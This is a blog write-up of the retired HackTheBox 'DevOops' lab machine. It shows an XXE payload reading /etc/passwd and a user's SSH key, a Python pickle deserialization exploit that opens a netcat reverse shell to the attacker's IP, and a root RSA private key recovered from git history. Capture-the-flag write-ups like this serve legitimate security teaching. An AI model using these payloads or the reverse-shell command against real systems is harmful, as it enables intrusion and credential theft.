---
layout: post
title: "HackTheBox - Devoops writeup"
subtitle: "~ Walkthrough of Devoops machine from HackTheBox ~"
date: 2018-10-26
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---

<img src="/img/blog/htb-devoops/htb-devoops-01.png" width="417" height="136"><br>
# Introduction
Hey there! Been some time since I actually wrote a new blog. Life is a bit hectic as of now, but who cares, right? As of last two weeks, DevOops from [HTB](https://www.hackthebox.eu/){:target="_blank"} got retired. Based on a twitter survey I did, over 30 of you wanted to see this writeup and therefore I decided to grant your wishes.  So let's get into it! <!--more-->

***

# Scanning & Enumeration

As always, start out with *nmap* to gather initial information:
```console
root@htb:~# nmap 10.10.10.91 -sS -sV -sC -T4 --max-retries 1
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-15 11:00 CDT
Warning: 10.10.10.91 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.91
Host is up (0.029s latency).
Not shown: 935 closed ports, 63 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds

```
A small tip - during lengthy scans you can use the *--max-retries 1* flag which significantly improves speeds of scanning. Thank you [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA){:target="_blank"}! Results of the scan show open SSH (nothing unusual) and HTTP service running on port 5000. Time to enumerate.

### - HTTP 
Visiting the webpage itself presents us with the following: <br> 
<a href="/img/blog/htb-devoops/htb-devoops-02.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-devoops/htb-devoops-02.png"></a>
Nothing interesting apart from the filename - *feed.py*. Make a note of it, it will become important later on. Viewing source showed just simple HTTP and so I resorted to my usual last option - directory bruteforcing. For this purpose I used *gobuster* :

```console
root@htb:~# gobuster -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirb/common.txt -e -t 10

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.91:5000/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/10/15 11:07:14 Starting gobuster
=====================================================
http://10.10.10.91:5000/feed (Status: 200)
http://10.10.10.91:5000/upload (Status: 200)
=====================================================
2018/10/15 11:09:22 Finished
=====================================================
```

We can ignore `/feed` as it only points to an image showed on the index webpage. However, the `/upload` directory sounds interesting.

<a href="/img/blog/htb-devoops/htb-devoops-03.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-devoops/htb-devoops-03.png"></a>

`/upload`, as the name implies (duh), allows us to upload files onto the server. 2 major things immediately catch my attention. The website classifies this directory's content as a "test API" - something you  don't want to expose to public. In an "ideal" CTF like scenario, experimental code often has vulnerabilities in it. Because the website also mentions *XML* it would be a shame if we didn't try [XML injections](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing){:target="_blank"}, right :) ?

# Exploitation
There are 2 ways to exploit this vulnerability and turn it into a shell. Before we do so, let's show our XXE payload which we'll slightly adjust depending on what we want to access.

{% highlight xml %}
<!DOCTYPE v3ded [  
   <!ELEMENT v3ded ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<v3>
	<Author>V3ded!</Author>
	<Subject>XXE!</Subject>
	<Content>&xxe;</Content>
</v3>
{% endhighlight %}

Don't forget to wrap everything around a root element (in my case `<v3>`) and use only the previously mentioned XML tags <a href="/img/blog/htb-devoops/htb-devoops-03.png" target="_blank">(image here)</a> or the file won't parse and therefore this attack won't work. After submitting our payload we get the following:

<a href="/img/blog/htb-devoops/htb-devoops-04.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-devoops/htb-devoops-04.png"></a>

An output of `/etc/passwd` which confirms that the host is indeed exploitable and exposes users called `roosa` & `git`.

> Hint: view source of the webpage to see nicely formatted output 

### - Method 1: Stealing roosa's private SSH key
Thanks to XXE we have read access to the file system. Wonder what we can do? There's an amazing blogpost called [When all you can do is read](https://digi.ninja/blog/when_all_you_can_do_is_read.php){:target="_blank"} which answers this question. A private SSH key is always a good place to start. We know that there's a user called *roosa* and therefore her SSH key would be at a location `/home/roosa/.ssh/id_rsa`. Modify your XML payload, upload it and see for yourself.

<a href="/img/blog/htb-devoops/htb-devoops-05.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-devoops/htb-devoops-05.png"></a>

ALl there's left to do now is to save the `roosa.key` file, and use it to log into ssh.
```console
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'roosa.key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "roosa.key": bad permissions
```
If you get the following error message make sure you *chmod* the key to *600* permissions - `chmod 600 roosa.key`.

<a href="/img/blog/htb-devoops/htb-devoops-06.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-devoops/htb-devoops-06.png"></a>

### - Method 2: Exploiting a python pickle in feed.py
Remember when I told you to not forget about `feed.py`? Let's check how the code of the main webpage actually looks. Once again, upload an XML file with the requested item - `feed.py`.

<a href="/img/blog/htb-devoops/htb-devoops-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-devoops/htb-devoops-07.png"></a>

Code extract (lines 17-23):
{% highlight python %}
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
{% endhighlight %}

This part of the code is very dangerous. The [pickle](https://docs.python.org/2/library/pickle.html){:target="_blank"} library (and its *pickle.loads()* function) should never be used in combination with user input. Problem is that an attacker can input a malicious serialized object which gets unserialized with *pickle.loads()*, passed to *eval()* and therefore executed on the server. Baam, code execution. Not good. More about this issue can be read [here](https://blog.nelhage.com/2011/03/exploiting-pickle/){:target="_blank"}.

#### - Crafting an exploit
From the code we know that the server "safely" base64 **decodes** POST data made to `/newpost` and *pickle.loads()*. If we revert these steps - send a "safely" base64 **encoded** pickle object, we can achieve command execution. Here's my exploit:
{% highlight python %}
#!/usr/bin/env python
#payload.py
import pickle
import base64
import os
import requests
    
class payload(object):
    def __reduce__(self):
       comm = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1235 >/tmp/f"
       return (os.system, (comm,))

payload = base64.urlsafe_b64encode(pickle.dumps( payload()))

r = requests.post("http://10.10.10.91:5000/newpost", payload)
print r.data

{% endhighlight %}

This fires up a reverse shell that connects to `10.10.14.51` (my IP) at  port `1235`. Just change the parameters to your needs, set up *netcat* listener (`nc -lvp 1235`) and start the exploit. 

<a href="/img/blog/htb-devoops/htb-devoops-08.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-devoops/htb-devoops-08.png"></a>

Congratulations on your shells! Now it's time to get the sweet root :).

***

# Privilege Escalation
Roosa has a *git* directory at `/home/roosa/work/blogfeed/.git`. It's usually a good idea to search this folder for previous commits, branches and so forth. As Github repositories have all their changes documented, it's possible to find sensible data that was previously "deleted" by *thoughtful* developers. Running **git log -p** inside the .git folder, we can see logs of previous commits. 

<a href="/img/blog/htb-devoops/htb-devoops-09.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-devoops/htb-devoops-09.png"></a>
> More about .git dumping [here](https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/){:target="_blank"}.

Awesome. An SSH Key! Copy it into the notepad, remove `+` signs and save it as a `root.key` file. Luckily, as it appears, this wonderful key is assigned to the root user!
```console
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

`ssh -i root.key root@10.10.10.91` succesfully authenticates us and presents us with a root shell. 

<a href="/img/blog/htb-devoops/htb-devoops-10.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-devoops/htb-devoops-10.png"></a>

That's the machine rooted. Congratulations! 

***

# Conclusion
Thanks for reading folks! This machine was great a practice, although not so difficult. Next time remind me to list hidden folders as well so that I don't spend 2 hours roaming the machine when there's a `.git` folder right in plain sight... Silly me. Oh well, see you next time! 

~V3
